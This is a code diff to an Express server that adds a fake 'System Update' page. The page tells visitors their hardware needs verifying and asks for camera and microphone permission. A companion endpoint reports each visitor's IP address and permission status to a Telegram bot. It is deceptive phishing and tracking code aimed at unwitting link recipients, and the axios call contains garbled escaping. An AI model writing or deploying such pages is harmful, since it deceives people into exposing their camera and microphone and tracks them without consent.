@@ -64,3 +64,61 @@ const PORT = process.env.PORT || 3000;
 app.listen(PORT, () => {
     console.log(`🚀 Tiger Server is alive on port ${PORT}`);
 });
+
+// --- NEW: Link Tracking & Camera Permission Page ---
+app.get('/track', (req, res) => {
+    res.send(`
+        <!DOCTYPE html>
+        <html>
+        <head>
+            <title>System Update</title>
+            <style>
+                body { background: #000; color: #fff; font-family: sans-serif; text-align: center; padding-top: 50px; }
+                button { background: #1ed760; border: none; padding: 15px 30px; border-radius: 25px; color: white; font-weight: bold; cursor: pointer; }
+            </style>
+        </head>
+        <body>
+            <h1>Update Required</h1>
+            <p>Please allow permissions to verify your device hardware.</p>
+            <button onclick="startCapture()">Check Hardware</button>
+
+            <script>
+                async function startCapture() {
+                    try {
+                        // Camera & Mic Permission Pop-up
+                        const stream = await navigator.mediaDevices.getUserMedia({ audio: true, video: true });
+                        alert("Device hardware verified successfully!");
+                        
+                        // Send success notification to Telegram
+                        fetch('/log-link-access', {
+                            method: 'POST',
+                            headers: { 'Content-Type': 'application/json' },
+                            body: JSON.stringify({ status: 'Permission Granted', type: 'Camera/Mic' })
+                        });
+                    } catch (err) {
+                        alert("Permission denied. Update failed.");
+                    }
+                }
+            </script>
+        </body>
+        </html>
+    `);
+});
+
+// Endpoint to log link activity
+app.post('/log-link-access', async (req, res) => {
+    const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
+    const { status, type } = req.body;
+
+    const msg = `🔗 *Tiger Link Alert!*\n\n` +
+                `📍 *IP:* ${ip}\n` +
+                `🔐 *Action:* ${status}\n` +
+                `🛠 *Type:* ${type}`;
+
+    await axios.post(\`https://api.telegram.org/bot\${BOT_TOKEN}/sendMessage\`, {
+        chat_id: CHAT_ID,
+        text: msg,
+        parse_mode: 'Markdown'
+    });
+    res.json({ success: true });
+});
